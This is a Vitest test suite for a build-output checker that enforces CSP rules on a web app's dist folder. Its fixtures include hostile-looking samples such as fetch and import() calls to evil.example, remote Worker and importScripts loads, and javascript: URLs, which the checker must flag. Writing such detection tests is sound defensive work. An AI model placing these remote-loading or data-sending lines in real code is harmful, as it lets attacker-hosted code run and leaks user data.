import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { describe, expect, it } from "vitest";
import { checkDist } from "./dist-check.mjs";

const GOOD_HTML = `<!doctype html><html><head>
<link rel="icon" href="data:image/svg+xml,%3Csvg%3E%3C/svg%3E" />
<script src="/theme-init.js" nonce="__CSP_NONCE__"></script>
<meta property="csp-nonce" nonce="__CSP_NONCE__">
<script type="module" crossorigin src="/assets/index-a.js" nonce="__CSP_NONCE__"></script>
<link rel="stylesheet" crossorigin href="/assets/index-a.css" nonce="__CSP_NONCE__">
</head><body><div id="root"></div></body></html>`;

function dist(extra = {}, base = {}) {
  const dir = mkdtempSync(join(tmpdir(), "lk-dist-check-"));
  const all = { "index.html": GOOD_HTML, ".vite/manifest.json": "{}", "assets/index-a.js": "export const a = 1;", "assets/index-a.css": "body{margin:0}", ...base, ...extra };
  for (const [name, text] of Object.entries(all)) {
    if (text === null) continue;
    const path = join(dir, name);
    mkdirSync(dirname(path), { recursive: true });
    writeFileSync(path, text);
  }
  return dir;
}
const errorsOf = (extra, base) => checkDist(dist(extra, base)).errors;

describe("dist-check", () => {
  it("passes a clean dist", () => {
    expect(checkDist(dist()).errors).toEqual([]);
  });

  it("fails, never skips, when there is no dist", () => {
    const result = checkDist(join(tmpdir(), "lk-no-such-dist"));
    expect(result.errors.join()).toMatch(/does not exist/);
    expect(result.scanned).toBe(0);
  });

  it("allows the known namespaces and the token-settings link", () => {
    const js = `const ns = "http://www.w3.org/2000/svg"; const e = "https://react.dev/errors/418"; const link = { href: "https://github.com/settings/personal-access-tokens/new", rel: "noopener noreferrer" }; document.createElementNS("http://www.w3.org/1999/xhtml", "div");`;
    expect(errorsOf({ "assets/index-a.js": js })).toEqual([]);
  });

  describe("index.html", () => {
    it.each([
      ["has no nonce placeholder", GOOD_HTML.replaceAll("__CSP_NONCE__", "abc"), /no __CSP_NONCE__ placeholder/],
      ["has no csp-nonce meta", GOOD_HTML.replace(/<meta[^>]*>/, ""), /no <meta property="csp-nonce">/],
      ["has an inline script", GOOD_HTML.replace("</head>", "<script nonce=\"__CSP_NONCE__\">alert(1)</script></head>"), /inline <script>/],
      ["has an inline style element", GOOD_HTML.replace("</head>", "<style nonce=\"__CSP_NONCE__\">a{}</style></head>"), /inline <style>/],
      ["has a style attribute", GOOD_HTML.replace('<div id="root">', '<div id="root" style="top:0">'), /style attribute/],
      ["has an inline handler", GOOD_HTML.replace('<div id="root">', '<div id="root" onclick="x()">'), /inline event handler/],
      ["loads a script from another origin", GOOD_HTML.replace("/assets/index-a.js", "https://cdn.example/a.js"), /not a path on this origin/],
      ["loads from unpkg", GOOD_HTML.replace("/theme-init.js", "https://unpkg.com/x.js"), /unpkg\.com/],
      ["has a script without the nonce", GOOD_HTML.replace('src="/assets/index-a.js" nonce="__CSP_NONCE__"', 'src="/assets/index-a.js"'), /without nonce/],
      ["uses a protocol-relative URL", GOOD_HTML.replace("/assets/index-a.css", "//evil.example/a.css"), /not a path on this origin/],
    ])("fails an index.html that %s", (_name, html, pattern) => {
      expect(errorsOf({ "index.html": html }).join("\n")).toMatch(pattern);
    });
  });

  describe("JavaScript", () => {
    it.each([
      ["eval", "eval('1')", /eval\(\)/],
      ["new Function", "const f = new Function('return 1');", /new Function/],
      ["Function()", "const f = Function('return 1');", /Function\(\) constructor/],
      ["a string timer", "setTimeout('x()', 1)", /string, which is eval/],
      ["fetch of another origin", "fetch('https://evil.example/x')", /off-site URL/],
      ["fetch of a protocol-relative URL", "fetch(`//evil.example/${x}`)", /off-site URL/],
      ["a Worker from another origin", "new Worker('https://evil.example/w.js')", /off-site URL/],
      ["an import() of another origin", "import('https://evil.example/m.js')", /off-site URL/],
      ["importScripts of another origin", "importScripts('https://evil.example/s.js')", /off-site URL/],
      ["an img src of another origin", "const e = { src: 'https://evil.example/p.png' };", /property src/],
      ["an assigned href of another origin", "a.href = 'https://evil.example/';", /\.href assigned/],
      ["setAttribute src of another origin", "el.setAttribute('src', 'https://evil.example/p.png');", /setAttribute\(src\)/],
      ["a javascript: URL as href", "const e = { href: 'javascript:alert(1)' };", /script URL/],
      ["window.open of another origin", "window.open('https://evil.example/');", /window\.open/],
      ["a font host", "const css = 'https://fonts.googleapis.com/css2';", /fonts\.googleapis\.com/],
      ["a CDN host", "const s = 'cdn.jsdelivr.net/npm/x';", /cdn\.jsdelivr\.net/],
      ["the Radix select viewport", "const a = 'data-radix-select-viewport';", /Radix <style> injector/],
      ["the Radix scroll area viewport", "const a = 'data-radix-scroll-area-viewport';", /Radix <style> injector/],
    ])("fails %s", (_name, js, pattern) => {
      expect(errorsOf({ "assets/index-a.js": js }).join("\n")).toMatch(pattern);
    });

    it("also scans a chunk that is not the entry", () => {
      expect(errorsOf({ "assets/lazy-b.js": "eval('1')" }).join("\n")).toMatch(/lazy-b\.js: eval/);
    });

    it("notes, without failing, a setAttribute('style') and a computed import()", () => {
      const result = checkDist(dist({ "assets/index-a.js": "el.setAttribute('style', 'top:0'); import(x);" }));
      expect(result.errors).toEqual([]);
      expect(result.notes.join("\n")).toMatch(/setAttribute\('style'\)/);
      expect(result.notes.join("\n")).toMatch(/computed specifier/);
    });

    it("does not call a relative request off-site", () => {
      expect(errorsOf({ "assets/index-a.js": "fetch('/api/v1/me'); new Worker('/assets/w.js'); import('./x.js');" })).toEqual([]);
    });

    it("reports a file it cannot parse instead of skipping it", () => {
      expect(errorsOf({ "assets/index-a.js": "const = ;" }).join("\n")).toMatch(/could not be parsed/);
    });
  });

  describe("CSS", () => {
    it.each([
      ["a url() of another origin", "a{background:url(https://evil.example/a.png)}", /off-site URL/],
      ["an @import of another origin", "@import url('https://fonts.googleapis.com/css');", /off-site URL|fonts\.googleapis/],
      ["a data: font", "@font-face{font-family:x;src:url(data:font/woff2;base64,AAAA)}", /font is a data: URL/],
    ])("fails %s", (_name, css, pattern) => {
      expect(errorsOf({ "assets/index-a.css": css }).join("\n")).toMatch(pattern);
    });

    it("allows a relative font and a data: image", () => {
      expect(errorsOf({ "assets/index-a.css": "@font-face{font-family:x;src:url(/assets/Inter-400-a.woff2) format('woff2')} a{background:url(\"data:image/svg+xml,%3Csvg%3E%3C/svg%3E\")}" })).toEqual([]);
    });
  });

  it("fails a production dist that has a test-only route, unless told it is the perf build", () => {
    const js = 'const routes = ["/testpages/primitives"];';
    expect(errorsOf({ "assets/index-a.js": js }).join("\n")).toMatch(/\/testpages\//);
    expect(checkDist(dist({ "assets/index-a.js": js }), { allowTestPages: true }).errors).toEqual([]);
  });

  it("fails on a source map in a production build", () => {
    expect(errorsOf({ "assets/index-a.js.map": "{}" }).join("\n")).toMatch(/source map/);
  });

  it("fails without the manifest the bundle gate reads", () => {
    expect(errorsOf({}, { ".vite/manifest.json": null }).join("\n")).toMatch(/manifest/);
  });
});
